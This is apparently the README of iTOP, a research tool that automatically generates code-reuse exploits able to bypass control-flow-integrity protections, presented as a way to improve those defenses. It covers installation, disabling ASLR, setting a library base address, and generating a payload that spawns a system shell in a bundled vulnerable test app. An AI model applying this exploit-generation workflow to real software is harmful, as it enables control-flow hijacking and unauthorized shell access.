# About
* This is the GitHub repository of the indirect transfer oriented programming (iTOP) tool. iTOP can be used for evaluating the potential for automated crafting of advanced code reuse attacks which can bypass state-of-the-art control flow integrity (CFI) policies. The goal is learn how these defenses can be further improved.

## Publication
to be added

## Demo Videos

* iTOP: exploit writing in ESL.
[![pic1.png](https://i.postimg.cc/6pF2ZBmX/pic1.png)](https://tinyurl.com/y6cmbvyt)

* iTOP: spawning a system shell exploit.
[![pic2.png](https://i.postimg.cc/QMW6gxNk/pic2.png)](https://tinyurl.com/y6a9gk7c)

* iTOP: spawning a system shell with no CFI policy used.
[![pic3.png](https://i.postimg.cc/9QX0qrpK/pic3.png)](https://tinyurl.com/yyvxncqj)

* iTOP: spawning a system shell with the VTint policy in-place.
[![pic4.png](https://i.postimg.cc/FFPBQ66S/pic4.png)](https://tinyurl.com/yyrso75k)


## Installation

To run iTOP, you need a python2 or pypy environment with angr and antlr4-python2-runtime installed. We recommend creating a python virtual environment. The steps to set one up with the proper packages are outlined below.

1. create python2 virtualenv using virtualenv, virtualenvwrapper, conda, pipenv, or similar::

    $ virtualenv autocoop

2. enter virtualenv & install requirements::

    source autocoop/bin/activate
    pip install -r requirements.txt

3. make sure that "." is in the $PYTHONPATH::

    export PYTHONPATH=.:$PYTHONPATH


## Running iTOP

To generate a payload with iTOP, some setup is required. To make results reproducible, ASLR has to be disabled, and the exploit generation script has to be updated with the proper base library address for your system. In a real attack, this information can be extracted using information leaks. Running the lxs script with everything configured correctly will lead to a call to 'system("/bin/sh")'.

1. disable aslr::

    $ cd exploitable_app
    $ ./disable_aslr.sh

2. run lxs::

    $ cd exploitable_app/testapp
    $ ./run.sh
    [+] allocated buffer at 0xa0000000
    [+] number of parameters supplied 3
    [+] loaded cmake-build-debug/libAPP.so at 0x7ffff7ff2000
    ...

3. update lib base address in exploit_generator.py::

    <Auto-COOP/tool/exploit_generator.py>
    ...
    config = Config("exploitable_app/nodejs/libnode.so",
                      0x7ffff7ff2000, <-- UPDATE THIS
                      0xa0000000,
                      4096,
                      )
    ...

4. generate the payload::

    $ export PYTHONPATH=.
    $ python autocoop/exploit_generator.py esl_scripts/testsuite_coop/shell.esl

5. run lxs again::

    $ cd exploitable_app/testapp
    $ ./run.sh
    [+] allocated buffer at 0xa0000000
    [+] number of parameters supplied 3
    [+] loaded cmake-build-debug/libAPP.so at 0x7ffff7ff2000
    [+] fd 3
    [+] execute w00t..
    $

6. you just spawned a shell!
